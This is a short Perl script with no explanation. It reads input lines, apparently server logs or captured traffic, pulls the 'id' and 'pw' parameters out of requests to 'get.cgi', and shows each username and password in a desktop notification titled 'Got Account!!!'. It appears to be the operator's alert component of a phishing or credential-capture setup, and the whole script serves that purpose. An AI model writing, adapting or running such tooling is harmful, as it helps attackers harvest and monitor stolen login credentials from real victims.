use strict;

$| = 1;

while(<>) {
  if( /get\.cgi\?id=([^&]+)&pw=([^&]+)/ ) {
    my @cmd = ('notify-send','-t','10000',"Username: $1  Password: $2",'Got Account!!!');
    system (@cmd) == 0 or die "Can't execute @cmd: $!";
  }
}
